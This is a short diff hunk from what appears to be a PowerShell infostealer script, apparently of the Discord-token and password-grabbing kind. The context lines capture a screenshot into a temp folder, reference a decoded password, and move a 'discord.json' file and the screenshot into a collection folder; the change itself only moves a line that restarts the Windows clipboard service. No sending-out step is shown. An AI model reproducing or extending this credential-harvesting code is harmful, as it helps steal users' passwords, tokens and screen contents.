@@ -900,8 +900,8 @@ Pass: $decodedPass
     $screenshotPath = ("$main_temp\screenshot.png")
     $screenshot.Save($screenshotPath, [Drawing.Imaging.ImageFormat]::Png)
     $screenshot.Dispose()
-    Restart-Service -Name "cbdhsvc*" -force
     Write-Host "[!] Screenshot Captured" -ForegroundColor Green
+    Restart-Service -Name "cbdhsvc*" -force
 
     Move-Item "$main_temp\discord.json" $folder_general -Force    
     Move-Item "$main_temp\screenshot.png" $folder_general -Force
